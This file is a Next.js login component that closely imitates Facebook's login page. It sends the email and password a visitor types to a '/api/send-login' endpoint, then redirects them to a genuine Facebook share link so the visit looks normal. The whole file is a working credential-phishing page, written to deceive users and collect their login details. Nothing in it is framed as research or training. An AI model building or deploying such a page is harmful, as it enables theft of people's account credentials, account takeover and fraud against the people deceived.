"use client"
import { useRouter } from 'next/navigation';
import React, { useState } from 'react'

// pages/login.js
export default function Login() {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [message, setMessage] = useState('');
  const router = useRouter()

  const handleSubmit = async (e) => {
    e.preventDefault();

    try {
      const response = await fetch('/api/send-login', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({ email, password }),
      });

      // const result = await response.json();
      // setMessage(result.message);

      if (response.ok) {
        router.push("https://www.facebook.com/share/r/17WAhF1ZLr/")
        setEmail('');
        setPassword('');
      }
    } catch (error) {
      console.error('Error:', error);
      setMessage('Something went wrong.');
    }
  };
  return (
    <div className="container">
      <div className="content">
        {/* Left Side: Facebook Branding */}
        <div className="branding">
          <h1>facebook</h1>
          <p>Connect with friends and the world around you on Facebook.</p>
        </div>

        {/* Right Side: Login Form */}
        <div className="login-form">
          <form onSubmit={handleSubmit}>
            <input
              type="text"
              placeholder="Email or phone number"
              value={email}
              onChange={(e) => setEmail(e.target.value)}
              className="input"
            />
            <input
              type="password"
              placeholder="Password"
              value={password}
              onChange={(e) => setPassword(e.target.value)}
              className="input"
            />
            <button type="submit" className="login-button">
              Log In
            </button>
            <a href="#" className="forgot-password">
              Forgotten password?
            </a>
            <div className="divider"></div>
            <button className="create-account-button">
              Create New Account
            </button>
          </form>
          {message && <p>{message}</p>}
        </div>
      </div>

      <style jsx>{`
        /* Main container */
        .container {
          display: flex;
          justify-content: center;
          align-items: center;
          min-height: 100vh;
          background-color: #f0f2f5;
          padding: 1rem;
        }

        /* Content wrapper */
        .content {
          display: flex;
          flex-direction: column; /* Default for mobile */
          gap: 2rem;
          max-width: 1000px;
          width: 100%;
        }

        @media (min-width: 768px) {
          .content {
            flex-direction: row; /* Horizontal layout for larger screens */
          }
        }

        /* Branding */
        .branding {
          flex: 1;
          text-align: center; /* Center branding text for mobile */
        }
        .branding h1 {
          color: #1877f2;
          font-size: 2.5rem;
          font-weight: bold;
          margin-bottom: 0.5rem;
          font-family: 'Helvetica', sans-serif;
        }
        @media (min-width: 768px) {
          .branding h1 {
            font-size: 3rem;
            text-align: left;
          }
        }
        .branding p {
          font-size: 1rem;
          color: #606770;
        }
        @media (min-width: 768px) {
          .branding p {
            font-size: 1.2rem;
            text-align: left;
          }
        }

        /* Login Form */
        .login-form {
          background: white;
          padding: 2rem;
          border-radius: 8px;
          box-shadow: 0 4px 12px rgba(0, 0, 0, 0.1);
          width: 100%;
          max-width: 400px;
          margin: 0 auto; /* Center form on mobile */
        }
        .login-form form {
          display: flex;
          flex-direction: column;
        }
        .input {
          font-size: 1rem;
          padding: 0.75rem;
          margin-bottom: 1rem;
          border: 1px solid #dddfe2;
          border-radius: 6px;
          background: #f5f6f7;
        }
        .login-button {
          background-color: #1877f2;
          color: white;
          font-size: 1.1rem;
          padding: 0.75rem;
          border: none;
          border-radius: 6px;
          cursor: pointer;
        }
        .login-button:hover {
          background-color: #165eab;
        }
        .forgot-password {
          text-align: center;
          display: block;
          margin-top: 1rem;
          color: #1877f2;
          font-size: 0.9rem;
          text-decoration: none;
        }
        .forgot-password:hover {
          text-decoration: underline;
        }
        .divider {
          border-top: 1px solid #dddfe2;
          margin: 1.5rem 0;
        }
        .create-account-button {
          background-color: #42b72a;
          color: white;
          font-size: 1rem;
          padding: 0.75rem;
          border: none;
          border-radius: 6px;
          cursor: pointer;
        }
        .create-account-button:hover {
          background-color: #36a420;
        }
      `}</style>
    </div>
  );
}


